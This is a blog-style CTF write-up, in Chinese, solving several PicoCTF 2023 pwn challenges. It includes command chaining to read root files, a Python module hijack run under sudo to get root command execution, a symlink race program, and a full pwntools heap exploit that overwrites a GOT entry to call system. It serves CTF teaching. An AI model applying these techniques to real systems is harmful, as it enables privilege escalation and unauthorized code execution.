layout: post
title: PicoCTF 2023 pwn wp
author: junyu33 & T1d
mathjax: true
tags: 

- pwn

categories:

  - ctf

date: 2023-3-30 19:00:00

---

比较简单，且不失趣味性。

<!-- more -->


## PicoCTF 2023 pwn wp

### challenge babygame01| statue: SOLVED | working: T1d

移动到（-1，86）位置，flag数量会被覆盖为64，直接输入`p`拿到flag

### challenge two-sum| statue: SOLVED | working: T1d

`2^31-1`和`1`，整数溢出

### challenge VNE| statue: SOLVED | working: T1d

根据提示，添加环境变量，以root身份执行ls命令。第一次执行‘`ls ``/root`’可以看到‘flag.txt’文件，

第二次利用`&&`符号执行‘`ls ``/root && cat ``/root/flag.txt`’拿到flag

### challenge hijacking| statue: SOLVED | working: T1d

使用`sudo -l`指令查看发现可以无密码使用root权限运行`.server.py`文件，查看该文件发现导入了`base64`包，直接在该文件夹创建一个新的`base64.py`文件，写入`import os;os.system('ls -a /root')`,再用`sudo /usr/bin/python3 /home/picoctf/.server.py`执行，我们可以看见已经打印出了root路径下的所有文件，包括`.flag.txt`文件，于是直接修改base64.py文件为`import os;os.system('cat /root/.flag.txt')`运行`.server.py`文件就可以拿到flag了

### challenge tic-tac | statue: SOLVED | working: junyu33

Ref: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

```C++
// vuln.cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
        while(1) {
                symlink("flag.txt", "test");
                unlink("test");
                symlink("dummy", "test");
                unlink("test");
        }
        return 0;
}
#!/bin/sh
# test.sh
while true
do
    ./txtreader test
done
g++ vuln.cpp -o vuln
nice -20 ./vuln
nice -n 20 ./test.sh
```

### challenge babygame02 | statue: SOLVED | working: junyu33

移动到（-1，51）位置，换成`\x7c`即可拿到flag。

### challenge Horsetrack | statue: SOLVED | working: T1d

检查未开`PIE`保护，查看程序存在新建、删除、打印堆的功能，但是打印堆前提是需要有四个以上的堆，其次程序在删除时未清空指针，同时程序还有一个隐藏功能可以修改存放在堆管理器中的堆，即存在UAF漏洞。因此该题仅需先泄露出tcache异或加密的密钥，然后通过隐藏功能将`free`的got表加入tcache，修改`free`的got表为`system`即可。

```Python
from pwn import *

# p = process('./vuln')
p = remote('saturn.picoctf.net', 63361)
elf = ELF('./vuln')
lib = ELF('./libc.so.6')


def choice(id_):
    p.recvuntil(b'Choice:')
    p.sendline(id_)


def change(id_, mess, spot):
    choice(b'0')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'characters:')
    p.sendline(mess)
    p.recvuntil(b'New spot?')
    p.sendline(spot)


def add(id_, size_, mess):
    choice(b'1')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'Horse name length (16-256)?')
    p.sendline(size_)
    p.recvuntil(b'characters:')
    p.sendline(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)


[add(str(i), b'23', b'a' * 23) for i in range(0, 5)]
delete(b'0')
add(b'17', b'23', b'\xff')

choice(b'3')
p.recvuntil(b'WINNER: ')
key = u16(p.recv(2))
print(hex(key))

add(b'14', b'24', b'a' * 31)
add(b'15', b'24', b'a' * 31)
delete(b'14')
delete(b'15')

free_got = elf.got['free'] - 0x18
payload = p64(free_got ^ key) + p64(0)
change(b'15', payload, b'16')

payload = b'/bin/sh\00' + b'\xff'
add(b'14', b'24', payload)
payload = p64(0) * 3 + p64(elf.sym['system'])
add(b'15', b'31', payload)
delete(b'14')

p.interactive()
```